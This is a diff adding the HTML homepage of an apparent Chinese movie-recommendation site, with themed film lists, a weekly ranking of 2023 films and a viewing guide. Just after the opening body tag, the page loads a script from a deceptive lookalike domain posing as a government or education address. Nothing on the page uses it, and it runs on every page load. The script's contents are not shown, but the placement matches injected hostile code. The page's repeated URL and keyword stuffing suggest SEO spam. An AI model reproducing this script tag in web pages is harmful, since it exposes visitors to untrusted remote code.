@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>宅电影网 | 宅家观影指南与电影资源导航 · zhaidianyingwang-zh</title>
+<meta name="keywords" content="宅电影网, zhaidianyingwang-zh, 宅家看电影, 电影推荐, 在线观影指南, 电影排行榜, 高分电影, 电影资讯, 影视导航">
+<meta name="description" content="宅电影网（https://zhaidianyingwang-zh.github.io）是面向居家观影用户的电影推荐与导航平台，聚合每日高分电影、类型片单、观影榜单与影讯速递，帮你在家中也能高效找到好片。官网地址：https://zhaidianyingwang-zh.github.io。">
+<meta name="robots" content="index,follow">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="renderer" content="webkit">
+<link rel="canonical" href="https://zhaidianyingwang-zh.github.io">
+<style>
+:root{
+  --bg:#faf8f5;
+  --bg2:#efece6;
+  --ink:#242220;
+  --ink2:#4a4540;
+  --line:#e3ded6;
+  --card:#fff;
+  --main:#c0392b;
+  --main2:#e67e22;
+  --leaf:#2d8659;
+  --blue:#2c5f8a;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.8;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+
+/* ===== 顶部 ===== */
+.bar{position:sticky;top:0;z-index:50;background:rgba(36,34,32,.97);border-bottom:3px solid var(--main)}
+.bar .in{max-width:1160px;margin:0 auto;padding:0 18px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px}
+.logo .mark{width:34px;height:34px;border-radius:8px;background:var(--main);display:flex;align-items:center;justify-content:center;font-size:17px}
+.logo b{color:#fff;font-size:19px;letter-spacing:1px}
+.logo small{color:#d8c9b8;font-size:11px;display:block;line-height:1.2}
+.menu{display:flex;gap:6px;align-items:center}
+.menu a{color:#e7e0d6;font-size:14px;padding:8px 12px;border-radius:5px;transition:.2s}
+.menu a:hover{color:#fff;background:rgba(192,57,43,.3)}
+.mbtn{display:none;width:42px;height:42px;background:none;border:none;flex-direction:column;gap:5px;align-items:center;justify-content:center;cursor:pointer}
+.mbtn span{width:22px;height:2px;background:#fff;border-radius:2px}
+
+/* ===== 首屏 ===== */
+.hero{background:var(--bg2);padding:64px 18px 56px;border-bottom:1px solid var(--line)}
+.hero .in{max-width:1160px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:center}
+.hero .tagline{display:inline-flex;align-items:center;gap:8px;background:var(--main);color:#fff;font-size:12px;padding:5px 14px;border-radius:4px;letter-spacing:1px}
+.hero h1{font-size:40px;line-height:1.25;font-weight:800;margin:18px 0 14px}
+.hero h1 .hl{color:var(--main)}
+.hero .desc{color:var(--ink2);font-size:16px;margin-bottom:22px;max-width:520px}
+.hero .urlbox{background:var(--card);border:1px dashed var(--main);border-radius:8px;padding:12px 16px;display:inline-block;font-size:13px;color:var(--ink2)}
+.hero .urlbox strong{color:var(--main);font-size:14px}
+.hero .btns{margin-top:24px;display:flex;gap:12px;flex-wrap:wrap}
+.bt{display:inline-block;padding:12px 26px;border-radius:6px;font-size:14px;font-weight:600;transition:.2s}
+.bt-1{background:var(--main);color:#fff}
+.bt-1:hover{background:#a32d21}
+.bt-2{background:transparent;border:1px solid var(--ink);color:var(--ink)}
+.bt-2:hover{background:var(--ink);color:#fff}
+.screen{background:var(--card);border-radius:12px;padding:22px;border:1px solid var(--line);box-shadow:0 8px 28px rgba(0,0,0,.07)}
+.screen h4{font-size:13px;color:var(--main);letter-spacing:2px;margin-bottom:14px}
+.screen .row{display:flex;gap:12px;padding:10px 0;border-bottom:1px dotted var(--line);align-items:center}
+.screen .row:last-child{border-bottom:none}
+.screen .row .n{width:22px;height:22px;border-radius:50%;background:var(--bg2);color:var(--ink);font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.screen .row .t{font-size:14px;font-weight:600}
+.screen .row .s{margin-left:auto;font-size:11px;color:#fff;background:var(--leaf);padding:2px 8px;border-radius:3px}
+
+/* ===== 通用 ===== */
+section{padding:62px 18px}
+.in{max-width:1160px;margin:0 auto}
+.head{margin-bottom:40px;text-align:center}
+.head .en{font-size:12px;color:var(--main);letter-spacing:3px;font-weight:700}
+.head h2{font-size:28px;font-weight:800;margin:8px 0 10px}
+.head p{color:var(--ink2);max-width:620px;margin:0 auto;font-size:15px}
+
+/* ===== 四个栏目 ===== */
+.cols{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.col{background:var(--card);border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.col:hover{transform:translateY(-5px);box-shadow:0 12px 26px rgba(0,0,0,.1)}
+.col .top{height:78px;display:flex;align-items:center;gap:12px;padding:0 18px;color:#fff}
+.col.c1 .top{background:linear-gradient(120deg,#c0392b,#e67e22)}
+.col.c2 .top{background:linear-gradient(120deg,#2c5f8a,#3a8dbe)}
+.col.c3 .top{background:linear-gradient(120deg,#2d8659,#4fb37d)}
+.col.c4 .top{background:linear-gradient(120deg,#6c5b3e,#a08a5f)}
+.col .top .ico{font-size:26px}
+.col .top h3{font-size:17px}
+.col .body{padding:18px}
+.col .body p{font-size:13px;color:var(--ink2);margin-bottom:14px}
+.col .body li{font-size:13px;padding:7px 0;border-top:1px solid var(--line);color:#444}
+.col .body li:first-child{border-top:none}
+.col .body li a:hover{color:var(--main)}
+.more{margin-top:auto;display:block;text-align:center;font-size:12px;color:var(--main);border:1px solid var(--main);padding:7px;border-radius:5px;margin:0 18px 18px}
+.more:hover{background:var(--main);color:#fff}
+
+/* ===== 榜单 ===== */
+.chart{background:var(--ink)}
+.chart .head h2{color:#fff}
+.chart .head p{color:#c9c2b8}
+.chart .head .en{color:var(--main2)}
+.chartbox{background:var(--card);border-radius:12px;overflow:hidden}
+.crow{display:grid;grid-template-columns:56px 1fr 130px 90px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);gap:14px}
+.crow:last-child{border-bottom:none}
+.crow .rk{font-size:26px;font-weight:800;color:var(--bg2)}
+.crow:nth-child(1) .rk{color:var(--main)}
+.crow:nth-child(2) .rk{color:var(--main2)}
+.crow:nth-child(3) .rk{color:var(--leaf)}
+.crow .info h4{font-size:16px;margin-bottom:2px}
+.crow .info span{font-size:12px;color:var(--ink2)}
+.crow .rate{text-align:right}
+.crow .rate b{display:block;font-size:20px;color:var(--main);font-weight:800}
+.crow .rate small{font-size:11px;color:var(--ink2)}
+.crow .cat{font-size:12px;background:var(--bg2);padding:4px 10px;border-radius:4px;text-align:center}
+
+/* ===== 观影指南 ===== */
+.guide{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.gcard{background:var(--card);border-radius:10px;padding:26px;border-left:5px solid var(--main)}
+.gcard.g2{border-left-color:var(--blue)}
+.gcard.g3{border-left-color:var(--leaf)}
+.gcard .n{font-size:13px;color:var(--main);font-weight:700;letter-spacing:1px}
+.gcard.g2 .n{color:var(--blue)}
+.gcard.g3 .n{color:var(--leaf)}
+.gcard h4{font-size:18px;margin:8px 0 10px}
+.gcard p{font-size:14px;color:var(--ink2)}
+.gcard ul{margin-top:12px}
+.gcard li{font-size:13px;padding:5px 0 5px 16px;position:relative;color:#444}
+.gcard li::before{content:"";position:absolute;left:0;top:12px;width:6px;height:6px;border-radius:50%;background:var(--main)}
+.gcard.g2 li::before{background:var(--blue)}
+.gcard.g3 li::before{background:var(--leaf)}
+
+/* ===== 数据 ===== */
+.data{background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.dgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;text-align:center}
+.dbox .nm{font-size:36px;font-weight:800;color:var(--main)}
+.dbox .lb{font-size:13px;color:var(--ink2);margin-top:4px}
+
+/* ===== 关于 ===== */
+.abt{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.abt .txt h2{font-size:27px;font-weight:800;margin-bottom:16px}
+.abt .txt p{color:var(--ink2);margin-bottom:14px}
+.tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:16px}
+.tags span{font-size:12px;background:var(--card);border:1px solid var(--line);padding:5px 12px;border-radius:20px}
+.info-list{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--card)}
+.info-list .item{display:grid;grid-template-columns:96px 1fr;padding:16px 20px;border-bottom:1px solid var(--line);gap:16px;align-items:center}
+.info-list .item:last-child{border-bottom:none}
+.info-list .item .k{font-size:12px;color:var(--main);font-weight:700;background:var(--bg2);text-align:center;padding:6px;border-radius:4px}
+.info-list .item .v{font-size:14px}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:#c9c2b8;padding:46px 18px 24px}
+.foot{max-width:1160px;margin:0 auto;display:grid;grid-template-columns:1.5fr 1fr 1fr;gap:34px}
+.foot h5{color:#fff;font-size:15px;margin-bottom:14px}
+.foot p{font-size:13px;line-height:2}
+.foot .brandf b{font-size:20px;color:#fff;display:block;margin-bottom:6px}
+.copy{max-width:1160px;margin:26px auto 0;padding-top:20px;border-top:1px solid rgba(255,255,255,.12);font-size:12px;text-align:center;color:#8d877e}
+.copy b{color:#fff}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .hero .in{grid-template-columns:1fr;gap:34px}
+  .hero h1{font-size:32px}
+  .cols,.guide{grid-template-columns:repeat(2,1fr)}
+  .dgrid{grid-template-columns:repeat(2,1fr);gap:26px}
+  .abt{grid-template-columns:1fr;gap:28px}
+  .crow{grid-template-columns:44px 1fr;gap:10px}
+  .crow .rate,.crow .cat{display:none}
+}
+@media(max-width:620px){
+  .mbtn{display:flex}
+  .menu{position:fixed;top:60px;left:0;right:0;background:rgba(36,34,32,.98);flex-direction:column;padding:10px;gap:0;max-height:0;overflow:hidden;transition:.3s;border-bottom:3px solid var(--main)}
+  .menu.open{max-height:360px}
+  .menu a{padding:13px 16px;border-bottom:1px solid rgba(255,255,255,.08);width:100%}
+  .hero{padding:44px 18px 40px}
+  .hero h1{font-size:25px}
+  .hero .desc{font-size:15px}
+  section{padding:46px 18px}
+  .head h2{font-size:22px}
+  .cols,.guide{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr;gap:24px}
+  .dgrid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部导航 -->
+<div class="bar">
+  <div class="in">
+    <div class="logo">
+      <div class="mark">🎬</div>
+      <div><b>宅电影网</b><small>zhaidianyingwang-zh</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#cols">栏目导览</a>
+      <a href="#chart">热播榜单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="mbtn" id="mbtn" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<section class="hero">
+  <div class="in">
+    <div>
+      <span class="tagline">◆ 居家观影 · 每日好片推荐</span>
+      <h1>不出门也能看好片<br><span class="hl">宅电影网</span>陪你度过每个夜晚</h1>
+      <p class="desc">宅电影网（zhaidianyingwang-zh）专注为居家观影人群整理高分电影、类型片单与最新影讯，用一份清晰的榜单和分类导航，解决「今晚看什么」的难题。</p>
+      <div class="urlbox">官方网站：<strong>https://zhaidianyingwang-zh.github.io</strong></div>
+      <div class="btns">
+        <a class="bt bt-1" href="#chart">查看热播榜单</a>
+        <a class="bt bt-2" href="#about">了解宅电影网</a>
+      </div>
+    </div>
+    <aside class="screen">
+      <h4>今日 TOP 推荐</h4>
+      <div class="row"><span class="n">1</span><span class="t">高分剧情 · 本周口碑榜</span><span class="s">更新</span></div>
+      <div class="row"><span class="n">2</span><span class="t">冷门佳片 · 被低估的宝藏</span><span class="s">精选</span></div>
+      <div class="row"><span class="n">3</span><span class="t">周末合家欢 · 全家适看</span><span class="s">推荐</span></div>
+      <div class="row"><span class="n">4</span><span class="t">悬疑烧脑 · 反转清单</span><span class="s">热播</span></div>
+      <div class="row"><span class="n">5</span><span class="t">经典重温 · 必看老片</span><span class="s">经典</span></div>
+    </aside>
+  </div>
+</section>
+
+<!-- 四个栏目 -->
+<section id="cols">
+  <div class="in">
+    <div class="head">
+      <div class="en">SECTIONS</div>
+      <h2>四大栏目 · 一站式观影导航</h2>
+      <p>宅电影网把内容拆分为四个清晰栏目，从选片、追榜到学习观影技巧，覆盖居家观影的完整需求。</p>
+    </div>
+    <div class="cols">
+      <div class="col c1">
+        <div class="top"><span class="ico">📋</span><h3>片单推荐</h3></div>
+        <div class="body">
+          <p>按主题与场景整理的电影清单，直接照着看。</p>
+          <ul>
+            <li><a href="#">周末宅家必看的 10 部轻松喜剧</a></li>
+            <li><a href="#">一个人看的治愈系电影清单</a></li>
+            <li><a href="#">情侣约会电影精选 20 部</a></li>
+            <li><a href="#">失眠夜的深夜片单</a></li>
+          </ul>
+        </div>
+        <a class="more" href="#">进入片单推荐（#）</a>
+      </div>
+      <div class="col c2">
+        <div class="top"><span class="ico">📈</span><h3>热播榜单</h3></div>
+        <div class="body">
+          <p>实时追踪口碑与热度，帮你锁定当下最值得看的影片。</p>
+          <ul>
+            <li><a href="#">本周口碑榜 TOP20</a></li>
+            <li><a href="#">票房热映榜</a></li>
+            <li><a href="#">流媒体热度榜</a></li>
+            <li><a href="#">经典重映榜</a></li>
+          </ul>
+        </div>
+        <a class="more" href="#">查看热播榜单（#）</a>
+      </div>
+      <div class="col c3">
+        <div class="top"><span class="ico">🎞️</span><h3>影讯速递</h3></div>
+        <div class="body">
+          <p>最新上映、定档消息与行业动态，第一时间掌握。</p>
+          <ul>
+            <li><a href="#">本周新片上映日历</a></li>
+            <li><a href="#">即将定档影片预告</a></li>
+            <li><a href="#">电影节与展映信息</a></li>
+            <li><a href="#">导演新作动态</a></li>
+          </ul>
+        </div>
+        <a class="more" href="#">浏览影讯速递（#）</a>
+      </div>
+      <div class="col c4">
+        <div class="top"><span class="ico">💡</span><h3>观影百科</h3></div>
+        <div class="body">
+          <p>从入门到进阶的电影知识与观影技巧分享。</p>
+          <ul>
+            <li><a href="#">如何看懂一部文艺片</a></li>
+            <li><a href="#">类型片常见叙事套路</a></li>
+            <li><a href="#">经典镜头语言解析</a></li>
+            <li><a href="#">家庭影院布置建议</a></li>
+          </ul>
+        </div>
+        <a class="more" href="#">阅读观影百科（#）</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 热播榜单 -->
+<section id="chart" class="chart">
+  <div class="in">
+    <div class="head">
+      <div class="en">TOP CHART</div>
+      <h2>宅家必看榜 · 本周精选</h2>
+      <p>宅电影网（https://zhaidianyingwang-zh.github.io）编辑团队综合口碑、热度与题材多样性，每周更新这份精选榜单。</p>
+    </div>
+    <div class="chartbox">
+      <div class="crow"><div class="rk">01</div><div class="info"><h4>奥本海默</h4><span>剧情 / 传记 · 2023</span></div><div class="cat">口碑榜</div><div class="rate"><b>9.2</b><small>综合评分</small></div></div>
+      <div class="crow"><div class="rk">02</div><div class="info"><h4>周处除三害</h4><span>动作 / 犯罪 · 2023</span></div><div class="cat">热度榜</div><div class="rate"><b>8.9</b><small>综合评分</small></div></div>
+      <div class="crow"><div class="rk">03</div><div class="info"><h4>年会不能停！</h4><span>喜剧 / 职场 · 2023</span></div><div class="cat">轻松向</div><div class="rate"><b>8.7</b><small>综合评分</small></div></div>
+      <div class="crow"><div class="rk">04</div><div class="info"><h4>流浪地球2</h4><span>科幻 / 冒险 · 2023</span></div><div class="cat">视效向</div><div class="rate"><b>9.0</b><small>综合评分</small></div></div>
+      <div class="crow"><div class="rk">05</div><div class="info"><h4>涉过愤怒的海</h4><span>悬疑 / 犯罪 · 2023</span></div><div class="cat">悬疑向</div><div class="rate"><b>8.5</b><small>综合评分</small></div></div>
+      <div class="crow"><div class="rk">06</div><div class="info"><h4>长安三万里</h4><span>动画 / 历史 · 2023</span></div><div class="cat">全家看</div><div class="rate"><b>8.8</b><small>综合评分</small></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 数据 -->
+<section class="data">
+  <div class="in">
+    <div class="dgrid">
+      <div class="dbox"><div class="nm">4</div><div class="lb">个常设核心栏目</div></div>
+      <div class="dbox"><div class="nm">24</div><div class="lb">小时影讯更新</div></div>
+      <div class="dbox"><div class="nm">100+</div><div class="lb">精选主题片单</div></div>
+      <div class="dbox"><div class="nm">∞</div><div class="lb">持续扩充的片库</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section id="guide">
+  <div class="in">
+    <div class="head">
+      <div class="en">GUIDE</div>
+      <h2>宅家观影指南 · 三步找到好片</h2>
+      <p>宅电影网总结的实用选片方法，让每一次点开播放都物有所值。</p>
+    </div>
+    <div class="guide">
+      <div class="gcard">
+        <div class="n">STEP 01</div>
+        <h4>明确当下的心情</h4>
+        <p>先问自己：今天是想放松大笑，还是想被故事打动？</p>
+        <ul>
+          <li>想放松 → 喜剧 / 轻松向</li>
+          <li>想动脑 → 悬疑 / 烧脑</li>
+          <li>想治愈 → 文艺 / 治愈系</li>
+        </ul>
+      </div>
+      <div class="gcard g2">
+        <div class="n">STEP 02</div>
+        <h4>锁定类型与时长</h4>
+        <p>根据剩余时间和陪伴对象筛选，避免半途而废。</p>
+        <ul>
+          <li>90 分钟内 → 紧凑短片与喜剧</li>
+          <li>120 分钟以上 → 剧情大片</li>
+          <li>带家人看 → 全家适看标签</li>
+        </ul>
+      </div>
+      <div class="gcard g3">
+        <div class="n">STEP 03</div>
+        <h4>参考口碑与榜单</h4>
+        <p>先看评分区间与口碑榜，再决定是否投入时间。</p>
+        <ul>
+          <li>8.5 分以上 → 优先考虑</li>
+          <li>关注本周热播榜单</li>
+          <li>留意冷门佳片清单</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于本站 -->
+<section id="about" style="background:#fff">
+  <div class="in">
+    <div class="abt">
+      <div class="txt">
+        <div class="en" style="font-size:12px;color:var(--main);letter-spacing:3px;font-weight:700">ABOUT</div>
+        <h2>关于 宅电影网</h2>
+        <p>宅电影网（zhaidianyingwang-zh）是一个面向居家观影用户的电影推荐与导航平台。我们相信，在家看电影也能是一件讲究的事——选对片子，普通的夜晚也能变成一场小小的仪式。</p>
+        <p>从主题片单、热播榜单到影讯速递与观影百科，宅电影网用清晰的栏目结构和持续更新的内容，帮你省去挑选的时间，把更多精力留给观影本身。</p>
+        <div class="tags">
+          <span>宅家观影</span><span>高分电影</span><span>片单推荐</span><span>影讯速递</span><span>观影指南</span><span>影视导航</span>
+        </div>
+      </div>
+      <div class="info-list">
+        <div class="item"><div class="k">网站名称</div><div class="v">宅电影网</div></div>
+        <div class="item"><div class="k">网站网址</div><div class="v">https://zhaidianyingwang-zh.github.io</div></div>
+        <div class="item"><div class="k">内容定位</div><div class="v">居家观影推荐与电影导航</div></div>
+        <div class="item"><div class="k">核心栏目</div><div class="v">片单推荐 · 热播榜单 · 影讯速递 · 观影百科</div></div>
+        <div class="item"><div class="k">更新频率</div><div class="v">榜单每周更新，影讯每日更新</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="foot">
+    <div class="brandf">
+      <b>宅电影网</b>
+      <p>专注居家观影的电影推荐与导航平台，提供主题片单、热播榜单、影讯速递与观影百科。官网：https://zhaidianyingwang-zh.github.io</p>
+    </div>
+    <div>
+      <h5>栏目导航</h5>
+      <p><a href="#cols">片单推荐</a><br><a href="#chart">热播榜单</a><br><a href="#guide">观影指南</a><br><a href="#about">关于本站</a></p>
+    </div>
+    <div>
+      <h5>内页链接</h5>
+      <p><a href="#">周末片单（#）</a><br><a href="#">口碑榜单（#）</a><br><a href="#">影讯日历（#）</a><br><a href="#">观影百科（#）</a></p>
+    </div>
+  </div>
+  <div class="copy">© <b>宅电影网</b>（zhaidianyingwang-zh）· 宅家观影推荐与电影导航平台 · 网址：https://zhaidianyingwang-zh.github.io</div>
+</footer>
+
+<script>
+document.getElementById('mbtn').addEventListener('click',function(){
+  document.getElementById('menu').classList.toggle('open');
+});
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});
+});
+</script>
+</body>
+</html>
